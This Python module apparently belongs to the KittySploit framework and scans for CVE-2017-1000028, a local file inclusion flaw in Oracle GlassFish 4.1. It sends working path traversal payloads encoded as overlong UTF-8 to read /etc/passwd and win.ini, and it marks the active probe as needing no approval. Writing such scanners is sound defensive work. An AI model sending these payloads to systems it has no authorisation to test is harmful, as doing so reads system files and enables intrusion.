#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle GlassFish Server Open Source Edition 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle GlassFish Server Open Source Edition 4.1 - Local File Inclusion Detection',
        'description': 'Oracle GlassFish Server Open Source Edition 4.1 is vulnerable to both authenticated and unauthenticated local file inclusion vulnerabilities that can be exploited by issuing specially crafted HTTP GET requests.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'oracle', 'glassfish', 'lfi', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45196',
            'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18822',
            'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904',
            'https://www.exploit-db.com/exploits/45196/',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-1000028',
        ],
        'cve': 'CVE-2017-1000028',
    }

    def run(self):
        for path in ('/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', '/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('bit app support', 'fonts', 'extensions',)
            body_regexes = ('root:.*:0:0:',)
            if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason='Oracle GlassFish Server Open Source Edition 4.1 - Local File Inclusion detected',
                    path=path,
                )
                return True
        return False

